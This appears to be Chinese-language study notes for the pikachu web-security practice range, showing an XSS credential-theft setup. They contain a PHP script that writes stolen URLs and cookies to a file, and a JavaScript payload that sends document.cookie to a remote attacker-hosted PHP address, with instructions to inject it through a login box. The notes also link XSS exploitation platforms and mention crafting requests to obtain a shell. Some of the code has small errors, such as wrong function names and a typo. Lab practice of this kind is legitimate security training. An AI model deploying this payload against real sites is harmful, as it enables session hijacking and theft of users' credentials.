> 靶场|pika
## 1.凭证窃取

```PHP
<?php
	$url = $_GET('u');
	$cookie = $_GET('c');
	$fp = fopen('cookie.txt',"a");//打开文件
	fwrite($fp,$url."||".$cookie."\n");//将获取内容进行写入,通过.进行拼接
	fclose($fp);//关闭文件
?>
```

```HTML
<script>
	var url = 'http://远程PHP文件地址?u='+window.location.href+'&c='+encodeURLComponent(document.cookie);//URL编码cookie防止有特殊字符
	document.write("<img src="+url+"/>");//发起请求
	//fetch(urk);
</script>
```
`fwrite` `fetch`均可发起请求
使用的时候将JS整理为1行，在登陆框提交

---

## 2.XSS平台
> 专门用于进行XSS漏洞验证、安全测试与教学的工具

- [蓝莲花XSS平台](https://github.com/firesunCN/BlueLotus_XSSReceiver)

- [Beef-xss](https://cloud.tencent.com/developer/article/2196746)


---
### 3.构造数据获取Shell
> 熟悉业务系统的情况下，可以根据流量包请求特征，构造请求从而实现攻击获取Shell

